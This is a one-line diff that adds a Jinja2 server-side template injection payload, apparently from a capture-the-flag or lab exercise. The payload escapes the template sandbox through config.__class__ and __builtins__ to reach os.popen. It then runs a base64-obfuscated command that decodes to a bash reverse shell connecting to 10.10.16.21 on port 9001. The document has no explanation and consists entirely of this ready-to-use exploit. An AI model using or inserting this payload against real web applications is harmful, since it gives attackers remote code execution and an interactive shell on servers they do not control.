@@ -1,0 +1,1 @@
+{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yMS85MDAxIDA+JjEK | base64 -d | bash").read() }}
